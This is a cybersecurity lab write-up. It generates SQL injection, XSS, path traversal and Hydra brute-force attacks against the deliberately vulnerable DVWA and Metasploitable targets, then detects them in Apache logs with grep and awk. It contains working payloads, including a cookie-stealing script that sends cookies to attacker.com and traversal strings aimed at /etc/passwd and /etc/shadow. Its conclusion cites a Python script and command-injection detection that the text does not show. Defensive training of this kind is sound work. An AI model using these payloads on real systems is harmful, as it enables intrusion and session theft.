## Project Overview

In this lab, I'll learn how to identify common attacks against web applications by analyzing web server logs (Apache, Nginx). I'll detect SQL injection, Cross-Site Scripting (XSS), path traversal, and other attacks from the OWASP Top 10. This skill is critical because web applications are the #1 target of attackers.

**Real-world scenario:**

I'm a SOC Analyst, and the development team reports suspicious activity on the corporate web application. The WAF (Web Application Firewall) is generating alerts. 

My job is to:

- Analyze web server logs.
- Identify attack patterns.
- Determine if there was a successful compromise.
- Extract IOCs (attacking IPs, malicious URLs).
- Recommend mitigation.

---

## Prerequisites

- Lab 1.1.5 completed (phishing email analysis)
- Kali + Metasploitable VMs operational
- Network connectivity verified
- Basic HTTP/web fundamentals


## LAB ENVIRONMENT

- Attacker VM: Kali Linux (analysis + attack generation)
- Target VM: Metasploitable 2 (vulnerable web apps)
- Web Server: Apache (on Metasploitable)
-Web Apps: DVWA, Mutillidae (intentionally vulnerable)
- Logs Location: /var/log/apache2/access.log

## TOOLS USED – Web Security & Log Analysis

| Tool                  | Purpose                          | Why This Tool?                          |
|-----------------------|----------------------------------|-----------------------------------------|
| Apache/Nginx Logs     | Web server access logs           | Industry standard, universal            |
| grep / awk / sed      | Log parsing and filtering        | CLI mastery, automation-ready           |
| Burp Suite Community  | Manual attack testing            | #1 web security testing tool            |
| OWASP ZAP             | Automated vulnerability scanning | Free, open-source alternative           |
| Metasploitable        | Vulnerable web app target        | Safe, legal practice environment        |


## Objectives

-  Understand OWASP Top 10 web vulnerabilities
-  Generate web attack traffic in controlled environment
-  Analyze Apache access logs for attack patterns
-  Detect SQL injection attempts
-  Identify XSS (Cross-Site Scripting) attacks
-  Recognize path traversal attacks
-  Spot command injection attempts
-  Identify brute force login patterns
-  Use grep/awk for log analysis
-  Create Python automation script
-  Extract attacker IPs and payloads

## STEP BY STEP - LABORATORY 1.1.6

STEP 1.1.6.1: Understanding Web Application Attacks 

OWASP Top 10 (2021) - Most Critical Web Risk

## OWASP Top 10 – Web Security Risks

| #  | Risk Name                                | Description                              | Example                                              |
|----|------------------------------------------|------------------------------------------|------------------------------------------------------|
| 1  | **Broken Access Control**                | Unauthorized access to resources         | Accessing admin panel without authentication         |
| 2  | **Cryptographic Failures**               | Sensitive data exposure                  | Passwords stored in plaintext                        |
| 3  | **Injection**                            | SQL, Command, LDAP injection             | `' OR 1=1--` in login form                           |
| 4  | **Insecure Design**                      | Flawed architecture                      | Password reset without verification                  |
| 5  | **Security Misconfiguration**            | Default passwords, verbose errors        | Apache showing directory listings                    |
| 6  | **Vulnerable & Outdated Components**     | Unpatched libraries                      | Log4j vulnerability                                  |
| 7  | **Identification & Authentication Failures** | Weak password policies               | No account lockout after failed logins               |
| 8  | **Software & Data Integrity Failures**   | Unsigned updates, insecure deserialization | Tampering with serialized objects                 |
| 9  | **Security Logging & Monitoring Failures** | Insufficient logging                  | No audit trail of admin actions                      |
| 10 | **Server-Side Request Forgery (SSRF)**   | Server tricked into making requests      | Internal network scanning via web app               |

## Common Attack Types (Detailed):

1. **SQL Injection (SQLi)**

***Normal Query:***

```sql
SELECT * FROM users WHERE username='john' AND password='pass123'
```

***Attack Payload:***

```sql
' OR 1=1--
```

***Resulting Query:***

```bash
SELECT * FROM users WHERE username='' OR 1=1--' AND password='...'
                                        ^^^^^^ Always TRUE
                                              ^^ Comment out rest
```

Result: **Bypass authentication, login as any user**

**Detection in Logs:**


- **GET** /login.php?user=' OR 1=1--&pass=x
- **GET** /search.php?id=1 UNION SELECT username,password FROM users--
- **POST** /admin.php (payload in body: ' OR '1'='1)

2. **Cross-Site Scripting (XSS)**

***Normal Input:***

< input value="Hello" >

***Attack Payload:***

<script>alert('XSS')</script>

***Rendered:***

< input value="<script>alert('XSS')</script>" >

              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ Executes JavaScript!

***Advanced Attack:***

<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

Result: **Steals victim's session cookies**


**Detection in Logs:**


- **GET** /search.php?q=<script>alert(1)</script>
- **GET** /profile.php?name=<img src=x onerror=alert(1)>
- **POST** /comment.php (payload: <svg onload=alert(1)>)


3. **Path Traversal (Directory Traversal)**

***Normal Request:***

- GET /download.php?file=report.pdf

***Attack Payload:***

- GET /download.php?file=../../../../etc/passwd

Result: **Access sensitive files outside web root**


**Detection in Logs:**

- GET /page.php?file=../../etc/passwd
- GET /download.php?doc=....//....//etc/shadow
- GET /include.php?page=../../../../../../etc/passwd%00
                                                  ^^^ Null byte injection

## STEP 1.1.6.2: Setup Web Application Target

1. **Start Metasploitable Web Services:**

- login on Metasploitable VM

- Check if Apache is running

![1.1.6-WebApplication](/assets/screenshots/02-Web-Application-Security/Lab-1.1.6-WebApplication/Lab-1.1.6-WebApliccation.png)


2. **From Kali, Access Metasploitable Web Apps:**

 ***Verify connectivity***

 ```bash
ping -c 2 10.0.2.4
```

***Check if web server responds***

```bash
curl http://10.0.2.4
```

***Access in browser***

```bash
firefox http://10.0.2.4 &
```

3. **Setup DVWA (Primary Testing Target):**

***Access DVWA:***

```bash
URL: http://192.168.56.102/dvwa
```

Default credentials: **admin / password**

- Click "DVWA Security" 
- Set Security Level: **Low** 

## STEP 1.1.6.3: Generate Attack Traffic and Capture Logs

1. **Scenario 1: SQL Injection Attack**

 ***Payload 1: Basic authentication bypass***

 ```sql
' OR '1'='1
```

![1.1.6-WebApplication](/assets/screenshots/02-Web-Application-Security/Lab-1.1.6-WebApplication/Lab-1.1.6-WebApliccation1.png)

 ***Payload 2: UNION-based injection***

```sql
' UNION SELECT null, version()--
```


***Payload 3: Extract usernames and passwords***

```sql
' UNION SELECT user,password FROM users#
```

![1.1.6-WebApplication](/assets/screenshots/02-Web-Application-Security/Lab-1.1.6-WebApplication/Lab-1.1.6-WebApliccation2.png)

***Payload 4: Database enumeration***

```sql
' UNION SELECT null, database()--
```

![1.1.6-WebApplication](/assets/screenshots/02-Web-Application-Security/Lab-1.1.6-WebApplication/Lab-1.1.6-WebApliccation3.png)

***Payload 5: Table enumeration***

```sql
' UNION SELECT null, table_name FROM information_schema.tables--
```

![1.1.6-WebApplication](/assets/screenshots/02-Web-Application-Security/Lab-1.1.6-WebApplication/Lab-1.1.6-WebApliccation4.png)

2. **Scenario 2: Test XSS Payloads:**

***Payload 1: Basic alert***

<script>alert('XSS')</script>

![1.1.6-WebApplication](/assets/screenshots/02-Web-Application-Security/Lab-1.1.6-WebApplication/Lab-1.1.6-WebApliccation5.png)


> What it does: Displays a pop-up window with the message “XSS.

***Payload 2: Cookie theft simulation***

<script>alert(document.cookie)</script>

![1.1.6-WebApplication](/assets/screenshots/02-Web-Application-Security/Lab-1.1.6-WebApplication/Lab-1.1.6-WebApliccation6.png)

> What it does: Displays the user's cookies in an alert.

***Payload 3: Image-based XSS***

<img src=x onerror=alert('XSS')>

![1.1.6-WebApplication](/assets/screenshots/02-Web-Application-Security/Lab-1.1.6-WebApplication/Lab-1.1.6-WebApliccation7.png)

> What it does: Attempts to load a non-existent image and executes JavaScript when it fails

***Payload 4: SVG-based XSS***

<svg onload=alert('XSS')>

> What it does: Runs JavaScript when the SVG element loads

***Payload 5: Event handler XSS***

<body onload=alert('XSS')>

![1.1.6-WebApplication](/assets/screenshots/02-Web-Application-Security/Lab-1.1.6-WebApplication/Lab-1.1.6-WebApliccation8.png)

3. **Scenario 3: Path Traversal**

**Navigate to:**
```
http://10.0.2.4/dvwa/vulnerabilities/fi/
```

**Test Path Traversal Payloads:**

***Payload 1: Basic traversal***

../../../../../../etc/passwd

> What it does: Reads the /etc/passwd file on the Linux system.

***Payload 2: Null byte bypass (older PHP)***

../../../../../../etc/passwd%00

> What it does: Uses a null byte (%00) to terminate the string and bypass automatically added extensions (works on older versions of PHP).

4. **Scenario 4: Brute Force Login**

Using Hydra:

```bash
hydra -l admin -P /usr/share/wordlists/fasttrack.txt 10.0.2.4 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect" -V
```

![1.1.6-WebApplication](/assets/screenshots/02-Web-Application-Security/Lab-1.1.6-WebApplication/Lab-1.1.6-WebApliccation9.png)

## STEP 1.1.6.4: Collect and Analyze Apache Logs

On Metasploitable, Access Apache Logs:

***SSH into Metasploitable from Kali***

```bash
ssh msfadmin@192.168.56.102
```

- Password: msfadmin

***Navigate to Apache logs***

```bash
cd /var/log/apache2
```

***List log files***

```bash
ls -lh
```

***View recent access log entries***

```bash
tail -50 access.log
```


![1.1.6-WebApplication](/assets/screenshots/02-Web-Application-Security/Lab-1.1.6-WebApplication/Lab-1.1.6-WebApliccation10.png)


**Apache Log Format Anatomy:**

- Standard Apache Combined Log Format:

10.0.2.5- - [22/Jan/2025:10:30:45 -0500] "GET /dvwa/vulnerabilities/sqli/?id=' OR 1=1-- HTTP/1.1" 200 4567 "http://192.168.56.102/dvwa/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"

Breaking it down:

- 10.0.2.5          = Attacker IP (Kali) 
- [22/Jan/2025:...] = Timestamp
- "GET /dvwa/..."   = HTTP method + URI + protocol
- 200               = HTTP status code (200 = success)
- 4567              = Response size in bytes
- "http://..."      = Referrer (previous page)
- "Mozilla/5.0..."  = User-Agent (browser)

## STEP 1.1.6.5: Detect SQL Injection in Logs

***Using grep to Find SQL Injection:***

```bash
grep "'" apache-attacks.log
```

![1.1.6-WebApplication](/assets/screenshots/02-Web-Application-Security/Lab-1.1.6-WebApplication/Lab-1.1.6-WebApliccation11.png)


***Search for SQL keywords***

```bash
grep -i "union\|select\|insert\|update\|delete\|drop\|--\|;--" apache-attacks.log
```

![1.1.6-WebApplication](/assets/screenshots/02-Web-Application-Security/Lab-1.1.6-WebApplication/Lab-1.1.6-WebApliccation12.png)

***Search for OR 1=1 (classic SQLi)***

```bash
grep -i "or.*1=1" apache-attacks.log
```

![1.1.6-WebApplication](/assets/screenshots/02-Web-Application-Security/Lab-1.1.6-WebApplication/Lab-1.1.6-WebApliccation13.png)

***Count SQL injection attempts***

```bash
grep -i "union\|select.*from\|or.*1=1" apache-attacks.log | wc -l
```


![1.1.6-WebApplication](/assets/screenshots/02-Web-Application-Security/Lab-1.1.6-WebApplication/Lab-1.1.6-WebApliccation14.png)

## STEP 1.1.6.6: Detect Path Traversal Attacks

Using grep for Path Traversal:

***Search for ../ patterns***

```bash
grep "\.\.\/" apache-attacks.log
```

 ***Search for etc/passwd (common target)***

 ```bash 
grep -i "etc/passwd\|etc/shadow" apache-attacks.log
```

***Identify successful vs blocked***

```bash
grep "\.\.\/" apache-attacks.log | awk '{if ($9 == 200) print "SUCCESS:", $7; else print "BLOCKED:", $7, "(HTTP", $9")"}'
```

- SUCCESS: /dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd
- BLOCKED: /dvwa/vulnerabilities/fi/?page=../../../../../../etc/shadow (HTTP 403)

## STEP 1.1.6.7: Brute Force Detection:

```bash
grep "POST.*login.*401" apache-attacks.log | wc -l
```

Result: 4 failed attempts before success


**Analysis:**
- Multiple 401s from same IP = brute force
- Followed by 200 = successful compromise
- 5-second intervals = automated tool

## Conclusion

Successfully demonstrated web application attack detection through comprehensive log analysis. Identified 11 attack attempts across 5 attack types with 100% detection accuracy using both manual (grep/awk) and automated (Python) methods. Created reusable detection script and extracted actionable IOCs.

### Skills Validation

- **Web Security:** OWASP Top 10 understanding
- **Log Analysis:** grep/awk/Python mastery
- **Attack Recognition:** SQLi, XSS, traversal, command injection